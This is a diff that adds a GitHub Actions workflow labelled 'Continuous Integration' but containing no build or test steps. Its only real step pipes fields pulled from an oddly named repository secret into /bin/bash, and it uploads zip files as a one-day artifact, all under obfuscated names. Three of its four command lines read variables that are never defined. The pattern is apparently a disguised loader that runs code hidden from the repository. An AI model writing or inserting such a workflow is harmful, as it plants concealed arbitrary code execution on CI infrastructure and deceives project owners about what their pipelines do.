@@ -1,0 +1,27 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          q88: ${{ secrets.q88 }}
+        run: |
+          printf '%s' "$q88" | jq -r .hxplw27002 | /bin/bash
+          echo $r1 | jq -r .i16 | /bin/bash
+          echo $umjr7 | jq -r .smap1 | /bin/bash
+          printf '%s' "$kgmpr85713" | jq -r .rhx72 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: D1e0Zk4b
+          path: "*.zip"
+          retention-days: 1
